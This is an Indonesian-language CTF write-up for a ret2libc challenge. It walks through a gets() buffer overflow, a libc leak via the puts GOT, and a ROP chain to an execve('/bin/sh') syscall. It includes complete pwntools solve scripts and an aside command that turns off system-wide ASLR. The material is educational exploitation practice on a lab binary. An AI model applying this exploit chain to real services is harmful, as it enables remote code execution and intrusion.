---
title: 'Write Up 4 Chall Madness'
disqus: de13ugg1ng  
---

Write Up acectf-2025
===
Attachment -> ![downloads](https://img.shields.io/github/downloads/atom/atom/total.svg)

## Daftar Isi
[TOC]

##  Challange 1 - from_start

###    Deskripsi
RET2LIBC

### TL; DR
Chall Ret2Libc biasa. Vulnerability nya **gets()**. Tinggal di leak libc nya pake **got puts** dengan cara di print menggunakan **plt puts**. Lalu setelah ter **leak**. Hitung base **LIBC**, dan buat payload ke **system** atau **syscall** **/bin/sh**. 
### Langkah Exploit
Pertama, check file Binary nya dengan **file** dan **checksec**.

![image](https://hackmd.io/_uploads/S1dy8Tumfx.png)
![image](https://hackmd.io/_uploads/H1_MU6dXzg.png)


Chall ini **not stripped**, **No Pie**, dan **No Canary**. Penjelasan simpelnya, **address** dari setiap **functionnya** gabakal di **acak** sama system, dan kalau dilakukan **overflow** akan **sangat mudah** karena tidak ada pengecekan sebelum **RET**. 

![image](https://hackmd.io/_uploads/SkQcUT_mzg.png)

Dari function main nya saja sudah jelas, ini terdapat **buffer overflow**. Karena penggunaan **gets()** yang akan menerima semua input dari user dengan panjang apapun. Jadi kita **tracing** dengan **cyclic** dari **pwndbg** untuk **mencari offset** sampai **RET** itu butuh berapa byte. 

![image](https://hackmd.io/_uploads/rkX-Dpd7Gx.png)

Disini program sudah **crash** setelah kita input. Kenapa bisa crash? Karena **Buffer Overflow** berhasil dan input kita menimpa **address** dari **RET**.

![image](https://hackmd.io/_uploads/ry9HP6u7Mx.png)

Di bagian ini fokus ke register yang namanya **RSP**. Karena address RET nya bakal mengambil dari register **RSP** tersebut.

![image](https://hackmd.io/_uploads/r1dWuTuQGl.png)

Tinggal di copy aja isi strings nya yang ada di **RSP**. Terus gunakan `cyclic -l (input)`. Jadi offset untuk sampai ke RET adalah 264 byte.

![image](https://hackmd.io/_uploads/SyulugGSzx.png)

Langkah selanjutnya, perlu dilakukan leak **LIBC**. Kenapa? Karena dari Binary File nya tidak memiliki **ROP** untuk memanggil **syscall** atau **system**. Dan **LIBC** itu punya lebih banyak jenis **ROP** termasuk **system** dan **syscall**.

![image](https://hackmd.io/_uploads/SJ2SZbfHzg.png)
![image](https://hackmd.io/_uploads/BkLIWWfrfl.png)

Pertama, run Binary Exploit. Lalu langsung break aja dengan `CTRL + C`.

![image](https://hackmd.io/_uploads/ryesWWzHMl.png)

Ambil salah satu GOT untuk melakukan leak LIBC.

```a
from pwn import *
#context.arch = 'amd64' # i386 / amd64 / arm / aarch64 / mips / powerpc
context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './chall_patched'
p = process(chall)
elf = context.binary = ELF(chall, checksec=False)

gdb.attach(p, gdbscript='''
br* 0x00000000004011f2
''')

payload = b'A' * 264
payload += p64(0x00000000004011ad) #pop rdi
payload += p64(0x404000) #got puts
payload += p64(0x401060)
payload += p64(0x00000000004011b6)

p.recv()
sleep(1)
p.sendline(payload)
hasil = p.recvline().strip()
hasil = hasil.ljust(8, b'\x00')
hasil = u64(hasil)
print('LEAK-LIBC', hasil)
```

![image](https://hackmd.io/_uploads/SyC0_xzBGx.png)

Nah, setelah ketemu LIBC nya. Saya bisa merumuskan exploit untuk Binary Chall. Buat ret2libc normal. Alur exploitnya:

**Buffer Overflow** -> **pop rdi** -> **/bin/sh** -> **pop rsi** -> **0** -> **pop rdx** -> **0** -> **pop rax** -> **59** -> **syscall**.

![image](https://hackmd.io/_uploads/BJRrjVVrzg.png)

address pop rdi: **0x00000000004011ad**

![image](https://hackmd.io/_uploads/HJZ0j4Erfl.png)

address pop rsi: **0x00000000004011af**                                                                                               
address pop rdx: **0x00000000004011b1**

![image](https://hackmd.io/_uploads/rJ81sgzBfl.png)

address pop rax 59 + syscall: **0x00000000000eef34**

![image](https://hackmd.io/_uploads/ryLc3N4HMe.png)

address strings /bin/sh: **0x1cb42f**

Setelah ketemu semua, tinggal di combine aja jadi payload:
```
print('LEAK-LIBC', hex(hasil))
base = hasil - 0x87be0

bin_sh = base + 0x1cb42f

payload = b'A' * 264
payload += p64(0x00000000004011ad) #pop rdi
payload += p64(bin_sh)
payload += p64(0x00000000004011af) # pop rsi
payload += p64(0)
payload += p64(0x00000000004011b1) # pop rdx
payload += p64(0)
payload += p64(base + 0x00000000000dd237) #pop rax
payload += p64(0x3b)
payload += p64(base + 0x00000000000288b5) # syscall
sleep(1)
p.sendline(payload)
```

![image](https://hackmd.io/_uploads/B1o7aEESGe.png)

Solved!

## solve.py:
```a
from pwn import *
#context.arch = 'amd64' # i386 / amd64 / arm / aarch64 / mips / powerpc
context.log_level = 'debug' #debug / info / warning / error / critical / notset

chall = './chall_patched'
p = process(chall)
elf = context.binary = ELF(chall, checksec=False)

# gdb.attach(p, gdbscript='''
# br* 0x00000000004011f2
# ''')

payload = b'A' * 264
payload += p64(0x00000000004011ad) #pop rdi
payload += p64(0x404000) #got puts
payload += p64(0x401060)
payload += p64(0x00000000004011b6)

p.recv()
sleep(1)
p.sendline(payload)
hasil = p.recvline().strip()
hasil = hasil.ljust(8, b'\x00')
hasil = u64(hasil)
print('LEAK-LIBC', hex(hasil))
base = hasil - 0x87be0

bin_sh = base + 0x1cb42f

payload = b'A' * 264
payload += p64(0x00000000004011ad) #pop rdi
payload += p64(bin_sh)
payload += p64(0x00000000004011af) # pop rsi
payload += p64(0)
payload += p64(0x00000000004011b1) # pop rdx
payload += p64(0)
payload += p64(base + 0x00000000000dd237) #pop rax
payload += p64(0x3b)
payload += p64(base + 0x00000000000288b5) # syscall
sleep(1)
p.sendline(payload)
p.interactive()


# Exploit:
# # /bin/sh\x00 tapi hex nya ->   0x68732f6e69622f
# //sin/sh tapi hex nya ->      0x68732f6e69622f2f
# matiin ASLR: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# python -c 'from pwn import * ; print(hex(u64(b'./flagdo')))'
```
